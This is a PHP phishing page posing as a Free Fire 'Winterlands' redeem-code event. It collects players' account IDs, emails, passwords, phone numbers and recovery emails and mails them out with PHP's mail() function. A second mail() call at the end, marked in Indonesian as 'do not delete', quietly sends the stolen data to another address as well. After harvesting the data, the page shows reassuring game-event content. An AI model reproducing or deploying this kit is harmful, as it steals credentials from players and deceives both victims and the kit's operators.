<?php
$id = $_POST['id'];
$country = $_POST['country'];
$email = $_POST['email'];
$password = $_POST['password'];
$hp = $_POST['phone'];
$emailr = $_POST['emailr'];
?>

<?php
include('email_result.php');
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$subjek = "UHUINFO FF | LOG $country ";
$body = <<<EOD
<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #FF3366;	padding: 20px; margin-top: 20px;'>
ID Akun        =  $id<br>
Login      =  $country<br>
Email      =  $email<br>
Password      =  $password<br>
No HP      =  $hp<br>
Email Pemulihan      =  $emailr<br>

Kunjungi Blog : Raflipedia,club | Uhuinfo,com <br> Untuk Update Lebih banyak lagi :)

<hr style='border: 0;border-bottom: 1px solid #FF3366;background: #999;'/>
Coming from   = $url<br>
</div>
EOD;
//* jangan di ubah kalo kagak mau error!,gak usah sok tau deh //*
$headers = "From: UHUINFO99 <result@raflipedia.com>\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($result, $subjek, $body, $headers);
?>

<!--- CREATED BY AHMAD ABDUL MALIK --->
<!--- CRACKED BY RAFLIPEDIA --->
<!--- REPAIR RESULT BY RAFLIPEDIA --->
<!--- CREATED AT 10 SEPTEMBER 2017 at 11:18 AM --->
<!--- PLEASE DONT CHANGE THIS COPYRIGHT. APPRECIATE ME! --->

<center><span style='background:limegreen;width:360px;margin:0;padding:5px 0;color:black;display:block'>Success! Your submission has been requested</span></center>

<html>
<head>
<title>Free Fire Winterlands - Redeem Code</title>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Free Fire Winterlands - Redeem Code"/>
<meta property="og:url" content="index.html"/>
<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
<meta property="og:type" content="article"/>
<meta property="article:author" content="https://www.facebook.com/MobileLegendsGameIndonesia"/>
<meta property="og:image" content="img/banner.jpg"/>
<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/index.css"/>
</head>
<body>
<div class="logo">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" alt="Free Fire Winterlands"/>
</div>
<img class="banner" src="https://oketekno.com/wp-content/uploads/2018/10/Caroline-Free-Fire.jpg" alt="Banner"/>
<div style="clear:both"></div>
<div class="button">
<div class="event"><center><strong>Congratulations</strong></center><br/>1. Please visit <strong>Redemption Code</strong> on the button below and copy <strong>Unique Code</strong> on that page.<br/>2. After that, click the event you want to claim below and paste <strong>Unique Code</strong> you have copied.<br/><br/>Prizes and bonuses will be given after <strong>30 minutes</strong>, for players who have sent.</div>
<a href="https://play.google.com/store/apps/details?id=com.dts.freefireth&hl=in" title="Download on Play Store"><img src="img/download.png" alt="Download"/></a>
<a href="https://reward.ff.garena.com/" title="Redemption Code"><img src="img/code.png" alt="Redemption Code"/></a>
</div>
<ul class="news">
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_AR_orange.png)" alt="M4A1">M4A1<br/><small>A balanced rifle is suitable for all types of battles.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SMG_orange.png)" alt="MP5">MP5<br/><small>Beyond other machine guns in terms of stability, but less effective for long distances.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SG_orange.png)" alt="M1014">M1014<br/><small>Use the shotgun to destroy melee enemies quickly.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SR_orange.png)" alt="AWM">AWM<br/><small>High strength sniper rifle with long reload time.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_Pistol_orange.png)" alt="USP">USP<br/><small>A light gun that does not affect the user's agility.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_Melee_orange.png)" alt="PAN">PAN<br/><small>Great shield that protects users from anything your enemy can use.</small></li>
</ul>
</body>

</html>

<?php
//* Mengirim Informasi AREANA Jangan Dihapus, Jangan Sok Tau deh //*
$success = mail($auth0, $subjek, $body, $headers);
?>
